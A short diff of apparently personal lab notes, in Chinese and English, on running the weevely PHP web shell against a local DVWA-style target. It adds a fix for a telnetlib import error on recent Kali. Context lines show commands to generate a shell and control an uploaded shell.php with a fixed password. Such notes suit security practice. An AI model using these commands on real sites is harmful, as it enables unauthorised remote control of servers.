@@ -159,6 +159,7 @@ weevely generate <password> <output_file>
 
 啟動: weevely http://localhost:8080/hackable/uploads/shell.php 123456
 
+!!!!!! 最新Kali 必須註釋 telnetlib
 the latest weevely need to fix the import telnetlib, just comment it.
 
 sudo nano /usr/share/weevely/modules/backdoor/tcp.py
@@ -166,4 +167,6 @@ sudo nano /usr/share/weevely/modules/backdoor/tcp.py
 control the webshell
 
 weevely http://localhost:8080/hackable/uploads/shell.php 123456
+
+
 
